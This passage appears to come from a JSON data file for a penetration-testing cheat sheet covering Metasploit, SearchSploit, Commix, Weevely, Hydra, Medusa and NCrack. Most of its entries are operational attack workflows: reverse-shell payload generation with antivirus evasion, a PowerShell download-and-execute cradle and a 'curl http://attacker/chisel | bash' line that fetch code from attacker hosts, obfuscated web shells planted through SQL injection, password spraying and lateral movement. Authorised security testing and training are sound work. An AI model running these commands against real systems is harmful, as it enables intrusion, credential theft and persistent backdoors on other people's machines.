            "command": "msfconsole -r handler.rc"
          },
          {
            "label": "Chain multiple scripts",
            "description": "Use resource command within msfconsole to load additional scripts.",
            "command": "resource /path/to/auxiliary_scans.rc; resource /path/to/exploit_chain.rc"
          }
        ]
      },
      {
        "name": "Payload staging and delivery",
        "stages": [
          {
            "label": "Generate staged payload",
            "description": "Create smaller staged payload for bandwidth-limited scenarios.",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o staged.exe"
          },
          {
            "label": "Host payload for download",
            "description": "Serve payload via Python HTTP server or Metasploit's web delivery module.",
            "command": "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; exploit"
          },
          {
            "label": "Execute on target",
            "description": "Use obtained RCE to download and execute the payload.",
            "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/payload')\""
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Started reverse TCP handler on 0.0.0.0:4444",
        "meaning": "The listener is ready; verify the correct interface and port before running multiple jobs.",
        "severity": "info"
      },
      {
        "indicator": "[+] Meterpreter session 1 opened",
        "meaning": "A shell was obtained; immediately note the session ID and background it for later use.",
        "severity": "info"
      },
      {
        "indicator": "[!] Exploit failed: A payload has not been selected",
        "meaning": "Set PAYLOAD appropriately or rely on the module's default before re-running.",
        "severity": "warning"
      },
      {
        "indicator": "[*] Command shell session 2 opened",
        "meaning": "Non-Meterpreter shell obtained; consider upgrading to Meterpreter for additional features.",
        "severity": "info"
      },
      {
        "indicator": "[-] Exploit failed: Rex::ConnectionTimeout The connection timed out",
        "meaning": "Target is unreachable or service is down; verify network connectivity and target availability.",
        "severity": "error"
      },
      {
        "indicator": "[*] Sending stage (175174 bytes) to 192.168.1.100",
        "meaning": "Staged payload is being delivered to the target; larger payloads may take longer.",
        "severity": "info"
      },
      {
        "indicator": "[!] Payload stager download failed",
        "meaning": "Target couldn't download second stage; check egress filtering or use stageless payload.",
        "severity": "warning"
      },
      {
        "indicator": "[+] 192.168.1.100:445 - Target is vulnerable",
        "meaning": "Auxiliary scanner confirmed vulnerability; proceed with exploitation module.",
        "severity": "success"
      }
    ],
    "advanced_usage": [
      {
        "title": "Global proxy pivoting",
        "scenario": "Operate Metasploit from behind SOCKS-proxied tunnels such as Chisel or Ligolo-ng.",
        "command": "msfconsole -q -x \"setg Proxies socks4:127.0.0.1:1080; setg ReverseListenerBindAddress 10.10.14.5; setg SessionLogging true\"",
        "notes": [
          "setg applies the proxy to every module so you do not have to reconfigure each one.",
          "Pair with autoroute or socks proxies for deep internal pivots."
        ]
      },
      {
        "title": "Custom module development",
        "scenario": "Create custom exploit or auxiliary module for unique vulnerabilities.",
        "command": "mkdir -p ~/.msf4/modules/exploits/custom && vim ~/.msf4/modules/exploits/custom/my_exploit.rb",
        "notes": [
          "Use existing modules as templates and follow Metasploit module structure.",
          "Reload modules with 'reload_all' command in msfconsole.",
          "Test thoroughly in isolated environments before deployment."
        ]
      },
      {
        "title": "AV evasion with custom encoders",
        "scenario": "Generate payloads that evade signature-based detection.",
        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x64/xor_dynamic -a x64 --platform windows -f exe -o payload.exe",
        "notes": [
          "Multiple encoding iterations increase evasion but also payload size.",
          "Test payloads against VirusTotal or similar services (with caution).",
          "Consider using custom templates with -x flag for better evasion."
        ]
      },
      {
        "title": "Automated exploitation with AutoPwn",
        "scenario": "Automatically exploit multiple services discovered in database.",
        "command": "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run; use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 10.10.14.5; exploit -j -z",
        "notes": [
          "Requires thorough reconnaissance and database population.",
          "Use with caution in production environments.",
          "Review and validate all automated actions."
        ]
      },
      {
        "title": "Session passing to external tools",
        "scenario": "Route Metasploit sessions through external C2 frameworks or tools.",
        "command": "sessions -u 1; use post/multi/manage/shell_to_meterpreter; set SESSION 1; run",
        "notes": [
          "Upgrade basic shells to Meterpreter for advanced features.",
          "Use route command to pivot through compromised hosts.",
          "Integrate with Cobalt Strike or other C2 frameworks via session passing."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Metasploit docs",
        "url": "https://docs.rapid7.com/metasploit/",
        "description": "Official user guides and module references."
      },
      {
        "label": "Module search",
        "url": "https://www.rapid7.com/db/modules/",
        "description": "Browse modules with filterable metadata."
      }
    ]
  },
  {
    "id": "searchsploit",
    "name": "SearchSploit",
    "summary": "SearchSploit is a command line search tool for Exploit-DB, allowing you to search through exploit database quickly.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install ExploitDB locally so searches work offline during field work.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y exploitdb",
            "copyable": true
          },
          {
            "detail": "searchsploit -u",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali already bundles SearchSploit; keep the exploit index fresh.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y exploitdb",
            "copyable": true
          },
          {
            "detail": "ln -sf /usr/share/exploitdb ~/.exploitdb",
            "copyable": true
          },
          {
            "detail": "searchsploit -V",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Pull ExploitDB's container when package installation is restricted.",
        "steps": [
          {
            "detail": "docker pull exploitdb/searchsploit",
            "copyable": true
          },
          {
            "detail": "docker run --rm exploitdb/searchsploit -u",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work exploitdb/searchsploit apache struts",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Search for Apache exploits",
        "command": "searchsploit apache",
        "notes": []
      },
      {
        "description": "Search with specific terms",
        "command": "searchsploit -t web -p linux kernel",
        "notes": []
      },
      {
        "description": "Copy exploit to current directory",
        "command": "searchsploit -m 44918",
        "notes": []
      },
      {
        "description": "Search by CVE",
        "command": "searchsploit CVE-2021-44228",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Update exploit database"
      },
      {
        "flag": "-t",
        "description": "Search by title"
      },
      {
        "flag": "-p",
        "description": "Platform filter"
      },
      {
        "flag": "-m",
        "description": "Copy exploit to current directory"
      },
      {
        "flag": "-x",
        "description": "Exclude exploits"
      },
      {
        "flag": "-n",
        "description": "Non-interactive mode"
      },
      {
        "flag": "-j",
        "description": "JSON output"
      }
    ],
    "operational_tips": [
      "Update database regularly for latest exploits.",
      "Use specific terms for better search results.",
      "Verify exploit applicability before use.",
      "Document exploit sources for attribution."
    ],
    "step_sequences": [
      {
        "title": "Exploit triage and preparation",
        "steps": [
          {
            "title": "Search with multiple keywords",
            "details": "Filter by platform, service, and CVE to narrow to relevant PoC code.",
            "command": "searchsploit -t linux ftp remote"
          },
          {
            "title": "Read the exploit inline",
            "details": "Quickly review usage instructions without leaving the terminal.",
            "command": "searchsploit -x exploits/linux/remote/17491.c"
          },
          {
            "title": "Copy into a working folder",
            "details": "Stage the exploit in your engagement workspace for modification.",
            "command": "searchsploit -m exploits/linux/remote/17491.c"
          },
          {
            "title": "Compile or adapt",
            "details": "Satisfy prerequisites (libs, targets) before firing the PoC.",
            "command": "gcc -o 17491 17491.c && ./17491 10.0.5.23"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Service scan to exploit deployment",
        "stages": [
          {
            "label": "Import nmap results",
            "description": "Use --nmap to cross-reference detected versions with known exploits.",
            "command": "nmap -sV -oX scans/internal.xml 10.0.5.0/24 && searchsploit --nmap scans/internal.xml"
          },
          {
            "label": "Exploit staging",
            "description": "Copy the PoC locally and integrate with Metasploit or a standalone runner.",
            "command": "searchsploit -m exploits/multi/http/47515.py"
          },
          {
            "label": "Execution and post-ex",
            "description": "Leverage Metasploit or custom scripts to run the exploit, then drop LinPEAS to escalate.",
            "command": "msfconsole -q -x \"use exploit/multi/http/jenkins_cli_deserialization; set RHOSTS 10.0.5.40; run\""
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Exploits: 41354, Shellcodes: 11609",
        "meaning": "Confirms the database synced successfully; note the numbers in reporting for currency.",
        "severity": "info"
      },
      {
        "indicator": "[!] No Results, Try: searchsploit --help",
        "meaning": "No entries match your query; broaden keywords or search by CVE.",
        "severity": "info"
      },
      {
        "indicator": "Path: exploits/multi/http/47515.py",
        "meaning": "The returned filesystem path is what you pass to -x or -m for inspection or copying.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Machine-readable export",
        "scenario": "Feed exploit metadata into automation or dashboards.",
        "command": "searchsploit --json log4shell > exploits/log4shell.json",
        "notes": [
          "Pair with jq to filter by platform or verified status before alerting your team.",
          "The JSON includes links to ExploitDB and mirrored PoCs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "ExploitDB",
        "url": "https://www.exploit-db.com/",
        "description": "Search the online database when Internet access is available."
      }
    ]
  },
  {
    "id": "commix",
    "name": "Commix",
    "summary": "Commix is an automated all-in-one OS command injection and exploitation tool that can be used by web developers, penetration testers, and security researchers.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install the package and ensure python3-requests is present for HTTP workflows.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y commix python3-requests",
            "copyable": true
          },
          {
            "detail": "commix --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Preinstalled on Kali; sync the repo for the latest tamper payloads.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y commix",
            "copyable": true
          },
          {
            "detail": "cd /usr/share/commix && sudo git pull",
            "copyable": true
          },
          {
            "detail": "commix --check-internet",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the upstream container when python environments are restricted.",
        "steps": [
          {
            "detail": "docker pull commixproject/commix",
            "copyable": true
          },
          {
            "detail": "docker run --rm commixproject/commix --version",
            "copyable": true
          },
          {
            "detail": "docker run --rm commixproject/commix --url 'http://target/ping?host=test'",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic command injection test",
        "command": "python3 commix.py -u 'https://example.com/page.php?id=1'",
        "notes": []
      },
      {
        "description": "Test POST request",
        "command": "python3 commix.py -u 'https://example.com/login.php' --data='user=test&pass=test'",
        "notes": []
      },
      {
        "description": "Use cookie for authentication",
        "command": "python3 commix.py -u 'https://example.com/page.php?id=1' --cookie='session=abc123'",
        "notes": []
      },
      {
        "description": "Test with custom user agent",
        "command": "python3 commix.py -u 'https://example.com/page.php?id=1' --user-agent='Custom Browser 1.0'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Target URL"
      },
      {
        "flag": "--data",
        "description": "POST data"
      },
      {
        "flag": "--cookie",
        "description": "HTTP cookie"
      },
      {
        "flag": "--user-agent",
        "description": "Custom user agent"
      },
      {
        "flag": "--proxy",
        "description": "Proxy server"
      },
      {
        "flag": "--batch",
        "description": "Batch mode (no interaction)"
      },
      {
        "flag": "--level",
        "description": "Test level (1-3)"
      },
      {
        "flag": "--risk",
        "description": "Risk level (1-3)"
      }
    ],
    "operational_tips": [
      "Use batch mode for automated testing.",
      "Test with different injection techniques.",
      "Document all command injection findings.",
      "Be careful with payload execution on production systems."
    ],
    "step_sequences": [
      {
        "title": "Classic command injection playbook",
        "steps": [
          {
            "title": "Probe the parameter",
            "details": "Identify which GET/POST parameter returns command output, often by using harmless payloads first.",
            "command": "commix --url 'http://target/ping?host=1.1.1.1'"
          },
          {
            "title": "Gain OS command execution",
            "details": "Escalate to interactive shells once commix confirms injection.",
            "command": "commix --url 'http://target/ping?host=1.1.1.1' --os-cmd whoami --batch"
          },
          {
            "title": "Upload a stager",
            "details": "Drop a lightweight web shell for later persistence if allowed by scope.",
            "command": "commix --url 'http://target/upload.php?file=tmp' --file-write shell.php --file-dest /var/www/html/shell.php"
          },
          {
            "title": "Pivot deeper",
            "details": "Use the new shell to run LinPEAS or stage a tunnel with Chisel.",
            "command": "curl http://attacker/chisel | bash -s server --reverse"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Web fuzzing to command injection to pivot",
        "stages": [
          {
            "label": "Identify parameters",
            "description": "Use ffuf or dirb to find dynamic endpoints that accept user input.",
            "command": "ffuf -w wordlists/params.txt -u http://target/ping?FUZZ=test"
          },
          {
            "label": "Exploit with commix",
            "description": "Leverage classic/semiblind injection techniques to gain command execution.",
            "command": "commix --url 'http://target/ping?host=1.1.1.1' --technique=classic --batch"
          },
          {
            "label": "Establish tunnel",
            "description": "Start Chisel or Ligolo-ng to reach internal apps after command execution.",
            "command": "chisel server -p 9002 --reverse"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] The provided GET parameter seems injectable",
        "meaning": "Commix confirmed exploitable input; capture verbose logs before moving to intrusive payloads.",
        "severity": "info"
      },
      {
        "indicator": "[+] The payload has been written to the temporary file",
        "meaning": "A file-write operation succeeded; verify permissions and reachability.",
        "severity": "info"
      },
      {
        "indicator": "[!] Critical: Stderr output detected",
        "meaning": "The command failed or WAF filtered it; adjust payload encoding or fallback to blind techniques.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Authenticated injection with CSRF token reuse",
        "scenario": "Exploit POST forms protected by CSRF tokens and session cookies.",
        "command": "commix --url 'http://target/admin/ping' --method POST --data 'target=1.1.1.1&token=abcd' --cookie 'PHPSESSID=xyz' --os-shell",
        "notes": [
          "Capture tokens with Burp and refresh them automatically using --cookie-file when possible.",
          "Pair with --tor or --proxy to rotate source IPs when rate limits exist."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Commix project",
        "url": "https://github.com/commixproject/commix",
        "description": "Source code and technique reference."
      }
    ]
  },
  {
    "id": "weevely",
    "name": "Weevely",
    "summary": "Weevely is a stealthy web shell that provides an SSH-like terminal on web servers and can be used for post-exploitation tasks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via apt or pipx and keep agents ready for dropper workflows.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y weevely python3-crypto",
            "copyable": true
          },
          {
            "detail": "weevely --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Weevely ships with Kali; sync modules and enable logging for engagements.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y weevely",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/.weevely/logs && weevely --version",
            "copyable": true
          },
          {
            "detail": "weevely session.log --info",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run Weevely from a container when you need to isolate payload generation.",
        "steps": [
          {
            "detail": "docker pull iarim/weevely",
            "copyable": true
          },
          {
            "detail": "docker run --rm iarim/weevely generate Sup3rPass /tmp/shell.php",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd)/loot:/loot iarim/weevely /loot/shell.php Sup3rPass http://target/shell.php",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Generate web shell",
        "command": "weevely generate password /tmp/shell.php",
        "notes": []
      },
      {
        "description": "Connect to web shell",
        "command": "weevely http://example.com/uploads/shell.php password",
        "notes": []
      },
      {
        "description": "Generate obfuscated shell",
        "command": "weevely generate password /tmp/shell.php -obfuscator 2",
        "notes": []
      },
      {
        "description": "Execute command on target",
        "command": "# After connecting: :shell ls -la",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "generate",
        "description": "Generate web shell"
      },
      {
        "flag": "-obfuscator",
        "description": "Obfuscation level"
      },
      {
        "flag": ":shell",
        "description": "Execute shell command"
      },
      {
        "flag": ":file_upload",
        "description": "Upload file"
      },
      {
        "flag": ":file_download",
        "description": "Download file"
      },
      {
        "flag": ":audit_asp",
        "description": "Audit ASP files"
      },
      {
        "flag": ":audit_php",
        "description": "Audit PHP files"
      }
    ],
    "operational_tips": [
      "Use strong passwords for shell protection.",
      "Obfuscate shells to avoid detection.",
      "Clean up shell files after use.",
      "Document all post-exploitation activities."
    ],
    "step_sequences": [
      {
        "title": "Web shell deployment",
        "steps": [
          {
            "title": "Generate obfuscated agent",
            "details": "Create a password-protected PHP agent ready for upload via sqlmap, file upload, or RCE.",
            "command": "weevely generate Sup3rPass shell.php"
          },
          {
            "title": "Upload or plant",
            "details": "Use sqlmap --file-write, Commix, or manual upload to place the agent on the target.",
            "command": "sqlmap -r request.txt --file-write shell.php --file-dest /var/www/html/cache.php"
          },
          {
            "title": "Establish session",
            "details": "Connect to the agent and verify command execution plus module availability.",
            "command": "weevely http://target/cache.php Sup3rPass"
          },
          {
            "title": "Collect post-ex evidence",
            "details": "Run modules (audit, network, shell) then drop LinPEAS for escalation data.",
            "command": "weevely> audit; weevely> upload linpeas.sh /tmp && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SQLi to web shell to privilege escalation",
        "stages": [
          {
            "label": "SQLMap file write",
            "description": "Use sqlmap to write the Weevely payload onto the server.",
            "command": "sqlmap -r request.txt --file-write shell.php --file-dest /var/www/html/shell.php"
          },
          {
            "label": "Weevely foothold",
            "description": "Interact with the shell for file browsing and command execution.",
            "command": "weevely http://target/shell.php Sup3rPass"
          },
          {
            "label": "Privilege escalation reconnaissance",
            "description": "Execute LinPEAS or WinPEAS through the shell to enumerate escalation primitives.",
            "command": "./linpeas.sh"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Generated backdoor at shell.php",
        "meaning": "The PHP agent was created locally; track the password and path in your notes.",
        "severity": "info"
      },
      {
        "indicator": "[+] Logging into remote shell",
        "meaning": "Weevely established a session; commands issued after this line come from the target.",
        "severity": "info"
      },
      {
        "indicator": "[!] Warning: Connection dropped",
        "meaning": "The remote shell disappeared; re-upload or switch to another transport such as Chisel.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Agent hardening",
        "scenario": "Deploy obfuscated shells that survive AV pattern matching and include fallback transports.",
        "command": "weevely generate Sup3rPass shell.php --obfuscate 3 --randomize --stealthy",
        "notes": [
          "Increase obfuscation levels sparingly to avoid server-side syntax errors.",
          "Consider chaining with HTTPS reverse proxies for encrypted transport."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Weevely documentation",
        "url": "https://github.com/epinna/weevely3",
        "description": "Modules, configuration, and usage tips."
      }
    ]
  },
  {
    "id": "hydra",
    "name": "Hydra",
    "summary": "Hydra is a fast network logon cracker that supports numerous protocols including SSH, RDP, FTP, SMB, HTTP, and databases.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install hydra with SSL libraries and curated wordlists for credential testing.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y hydra hydra-gtk seclists",
            "copyable": true
          },
          {
            "detail": "hydra -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Hydra ships with Kali; refresh Seclists and create an output directory per engagement.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y hydra seclists",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/hydra-output && chmod 700 ~/hydra-output",
            "copyable": true
          },
          {
            "detail": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/commoncredentials/10-million-password-list-top-100000.txt ssh://127.0.0.1 -t 4 -f",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the containerized build when the host cannot compile THC tools.",
        "steps": [
          {
            "detail": "docker pull vanhauser/hydra",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work vanhauser/hydra -L /work/users.txt -P /work/passwords.txt ssh://10.10.10.10 -t 4",
            "copyable": true
          },
          {
            "detail": "cat hydra.restore",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SSH brute force",
        "command": "hydra -L users.txt -P passwords.txt ssh://192.168.1.50",
        "notes": []
      },
      {
        "description": "HTTP POST form",
        "command": "hydra -l admin -P passwords.txt 192.168.1.20 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"",
        "notes": []
      },
      {
        "description": "FTP login",
        "command": "hydra -l admin -P passwords.txt ftp://10.0.0.10",
        "notes": []
      },
      {
        "description": "RDP brute force",
        "command": "hydra -L users.txt -P passwords.txt rdp://corpdc.local",
        "notes": []
      },
      {
        "description": "MySQL authentication",
        "command": "hydra -L users.txt -P passwords.txt mysql://db.internal",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-l/-L",
        "description": "Single username (-l) or username list (-L)"
      },
      {
        "flag": "-p/-P",
        "description": "Single password (-p) or list (-P)"
      },
      {
        "flag": "-s",
        "description": "Custom port"
      },
      {
        "flag": "-S/-4/-6",
        "description": "SSL (-S) or force IPv4/IPv6"
      },
      {
        "flag": "-t",
        "description": "Parallel tasks (threads)"
      },
      {
        "flag": "-f",
        "description": "Stop on first valid credential"
      },
      {
        "flag": "-V/-d",
        "description": "Verbose or debug output"
      },
      {
        "flag": "-o",
        "description": "Write results to file"
      },
      {
        "flag": "http-post-form",
        "description": "Module syntax for form-based auth"
      }
    ],
    "operational_tips": [
      "Verify you are allowed to brute force the service and coordinate with blue teams.",
      "Tune threads (-t) to respect target stability and lockout policies.",
      "Use stop-on-success (-f) to reduce noise once credentials are found.",
      "Combine Hydra with compromised wordlists unique to the engagement."
    ],
    "step_sequences": [
      {
        "title": "HTTP POST brute-force playbook",
        "steps": [
          {
            "title": "Confirm target form",
            "details": "Capture the login request with Burp/ZAP and note the failure response and CSRF tokens.",
            "command": "curl -I https://target.local/login"
          },
          {
            "title": "Build hydra syntax",
            "details": "Translate the captured request into the http-post-form expression with ^USER^/^PASS^ placeholders.",
            "command": "printf '/login:username=^USER^&password=^PASS^:F=Invalid login' > form.rule"
          },
          {
            "title": "Launch attack",
            "details": "Throttle threads to respect lockout policies and stop on first success.",
            "command": "hydra -L users.txt -P passwords.txt 192.168.10.25 http-post-form @form.rule -t 6 -f -o ~/hydra-output/web_hits.txt"
          },
          {
            "title": "Validate credentials",
            "details": "Log in with curl or the browser to confirm the pair before pivoting.",
            "command": "curl -s -d 'username=alice&password=Summer2024!' https://target.local/login"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Custom wordlist \u2192 Hydra \u2192 Lateral movement",
        "stages": [
          {
            "label": "Harvest candidate words",
            "description": "Use CeWL or Crunch to build a target-specific list.",
            "command": "cewl -d 2 -m 6 https://intranet.target.local -w cewl.txt"
          },
          {
            "label": "Hydra credential spray",
            "description": "Attack SSH/HTTP endpoints with scoped credentials.",
            "command": "hydra -L users.txt -P cewl.txt ssh://10.10.14.12 -t 4 -o hydra_ssh_hits.txt"
          },
          {
            "label": "Use credentials for access",
            "description": "Feed recovered accounts into Evil-WinRM or Impacket modules.",
            "command": "evil-winrm -i dc.internal -u administrator -p 'RecoveredPass!'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[DATA] attacking service http-post-form on 192.168.10.25",
        "meaning": "Hydra started sending login attempts; coordinate with blue teams if needed.",
        "severity": "info"
      },
      {
        "indicator": "[22][ssh] host:192.168.10.10 login: devops password: Autumn2024!",
        "meaning": "Valid credentials recovered; stop (-f) and document immediately.",
        "severity": "high"
      },
      {
        "indicator": "[ERROR] target 192.168.10.25 timeout",
        "meaning": "The host throttled connections; lower thread count or pause before retrying.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Distributed hydra with restore files",
        "scenario": "Resume large credential attacks across scanners or after being paused by defenders.",
        "command": "hydra -I -L users.txt -P passwords.txt -M hosts.txt rdp -t 4 -w 5 -o results.txt",
        "notes": [
          "The -I flag consumes hydra.restore so you can split workloads between operators.",
          "Keep host lists segmented to avoid hammering the same server from multiple IPs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "THC Hydra repository",
        "url": "https://github.com/vanhauser-thc/thc-hydra",
        "description": "Official source and module documentation."
      }
    ]
  },
  {
    "id": "medusa",
    "name": "Medusa",
    "summary": "Medusa is a speedy, parallel, and modular login brute forcer. It supports many protocols and services.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install medusa and supporting libraries for SMB/RDP modules.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y medusa libfreerdp2-2",
            "copyable": true
          },
          {
            "detail": "medusa -d",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Medusa ships with Kali; enable logging in /etc/medusa.conf for better auditing.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y medusa",
            "copyable": true
          },
          {
            "detail": "sudo sed -i 's/^#LOG_PATH/LOG_PATH/' /etc/medusa.conf",
            "copyable": true
          },
          {
            "detail": "medusa -M smbnt -q",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use a container when compiling medusa locally is not possible.",
        "steps": [
          {
            "detail": "docker pull linuxserver/medusa",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/loot linuxserver/medusa medusa -M ssh -h 10.0.5.15 -U /loot/users.txt -P /loot/passes.txt",
            "copyable": true
          },
          {
            "detail": "cat medusa.log",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SSH brute force",
        "command": "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
        "notes": []
      },
      {
        "description": "FTP brute force with multiple users",
        "command": "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp",
        "notes": []
      },
      {
        "description": "HTTP basic auth",
        "command": "medusa -h https://example.com -u admin -P passwords.txt -M http",
        "notes": []
      },
      {
        "description": "RDP brute force",
        "command": "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M rdp",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-h",
        "description": "Target host"
      },
      {
        "flag": "-u/-U",
        "description": "Username or user file"
      },
      {
        "flag": "-p/-P",
        "description": "Password or password file"
      },
      {
        "flag": "-M",
        "description": "Module name"
      },
      {
        "flag": "-m",
        "description": "Module options"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-f",
        "description": "Stop on successful login"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      }
    ],
    "operational_tips": [
      "Use appropriate thread counts to avoid detection.",
      "Combine with good wordlists for better success rates.",
      "Stop on success to reduce noise after finding credentials.",
      "Document all successful authentication attempts."
    ],
    "step_sequences": [
      {
        "title": "SMB password spraying",
        "steps": [
          {
            "title": "Validate SMB exposure",
            "details": "Ensure TCP/445 is reachable and note lockout policies before spraying.",
            "command": "smbclient -L \\\\fileserver -N"
          },
          {
            "title": "Execute medusa module",
            "details": "Spray a curated list with stop-on-success enabled.",
            "command": "medusa -h fileserver -U users.txt -P spray.txt -M smbnt -t 4 -f -O smb_medusa.log"
          },
          {
            "title": "Respect lockouts",
            "details": "Introduce global delays between rounds when policies are strict.",
            "command": "medusa -h fileserver -U users.txt -p Winter2024! -M smbnt -g 900"
          },
          {
            "title": "Verify success",
            "details": "Check share access or run impacket tools with the recovered credential.",
            "command": "smbclient \\\\fileserver\\\\c$ -U 'corp\\\\alice%Winter2024!'"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "User discovery \u2192 Medusa spray \u2192 Impacket pivot",
        "stages": [
          {
            "label": "Harvest usernames",
            "description": "Use enum4linux, BloodHound, or exported AD lists to build targets.",
            "command": "enum4linux -U fileserver > users.txt"
          },
          {
            "label": "Timed spray",
            "description": "Run medusa with per-guess delays to stay within policy.",
            "command": "medusa -M rdp -H hosts.txt -U users.txt -p Winter2024! -g 600 -O rdp_spray.log"
          },
          {
            "label": "Lateral movement",
            "description": "Leverage the working credential with psexec.py or winrm shells.",
            "command": "psexec.py corp/alice:Winter2024!@fileserver cmd.exe"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "ACCOUNT FOUND: [smbnt] Host:fileserver User:alice Password:Winter2024!",
        "meaning": "Medusa confirmed valid credentials; store the tuple securely.",
        "severity": "high"
      },
      {
        "indicator": "ACCOUNT LOCKED: User:bob",
        "meaning": "The spray locked an account; halt immediately and notify defenders.",
        "severity": "critical"
      },
      {
        "indicator": "AUTH FAILURE: [rdp] Host:10.0.5.20",
        "meaning": "Standard failure; continue but track counts per account against lockout limits.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom HTTP module tuning",
        "scenario": "Handle bespoke portals where success is marked by redirects instead of status 200.",
        "command": "medusa -H portal_hosts.txt -U users.txt -P passes.txt -M http -m AUTH:success=302,fail=401 -t 6",
        "notes": [
          "The -m AUTH syntax adjusts success/failure regex without editing module code.",
          "Combine with -O for parseable JSON logs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Medusa documentation",
        "url": "https://www.foofus.net/goons/jmk/medusa/medusa.html",
        "description": "Module parameters and usage examples."
      }
    ]
  },
  {
    "id": "ncrack",
    "name": "NCrack",
    "summary": "NCrack is a high-speed network authentication cracking tool that supports many protocols.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install ncrack along with SSL libraries for encrypted services.",
        "steps": [
          {
            "detail": "sudo apt update",
